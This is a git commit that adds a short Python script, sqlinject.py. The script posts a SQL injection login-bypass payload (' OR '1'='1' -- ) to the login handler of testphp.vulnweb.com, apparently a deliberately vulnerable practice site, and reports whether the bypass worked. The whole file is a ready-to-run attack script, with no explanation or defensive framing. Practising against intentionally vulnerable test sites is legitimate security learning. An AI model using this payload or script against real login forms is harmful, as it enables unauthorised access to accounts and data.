af00a57cd630f88a45678babe502d5702ce1ee65
Harish5nu <saudharish770@gmail.com>
2025-02-10 11:29:13 +0545

    Initial commit

---
+++ sqlinject.py
@@ -0,0 +1,15 @@
+import requests
+
+url = "http://testphp.vulnweb.com/userinfo.php" 
+
+payload = {
+    "uname": "' OR '1'='1' -- ",
+    "pass": "anything"
+}
+
+response = requests.post(url, data=payload)
+
+if response.status_code == 200 and ("Welcome" in response.text or "dashboard" in response.text or "logout" in response.text):
+    print(f"[+] SQL Injection Successful with payload:")
+else:
+    print("[-] Injection Failed! Server response did not indicate success.")
